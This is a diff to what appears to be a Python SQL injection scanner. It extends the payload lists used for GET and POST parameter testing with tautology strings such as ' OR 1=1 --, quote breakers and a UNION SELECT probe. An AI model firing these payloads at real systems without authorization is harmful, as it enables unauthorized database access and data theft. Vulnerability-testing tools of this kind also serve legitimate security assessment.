@@ -19,7 +19,8 @@ def scan(target):
 
 def scan_get(target):
     output = "[*] Testing GET-based SQL Injection...\n"
-    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR 1=1#", "' OR 1=1 -- "]
+    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR 1=1#", "' OR 1=1 -- ", "'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"]
+    
 
     for param in parse_qs(urlparse(target).query).keys():
         for payload in payloads:
@@ -37,7 +38,7 @@ def scan_get(target):
 
 def scan_post(target):
     output = "[*] Testing POST-based SQL Injection...\n"
-    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR 1=1#", "' OR 1=1 -- "]
+    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR 1=1#", "' OR 1=1 -- ",  "'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"]
 
     parsed_url = urlparse(target)
     base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
